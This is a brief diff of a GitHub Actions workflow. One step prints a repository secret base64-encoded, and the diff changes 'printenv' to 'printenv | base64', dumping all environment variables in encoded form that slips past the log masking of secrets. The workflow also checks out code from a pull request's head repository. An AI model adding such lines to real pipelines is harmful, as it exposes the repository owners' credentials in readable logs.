@@ -22,7 +22,7 @@ jobs:
           TEST: ${{ secrets.WAHOO }}
         run: |
           echo $TEST | base64
-          printenv
+          printenv | base64
       - uses: actions/checkout@v6
         with:
           repository: ${{ github.event.pull_request.head.repo.full_name }}
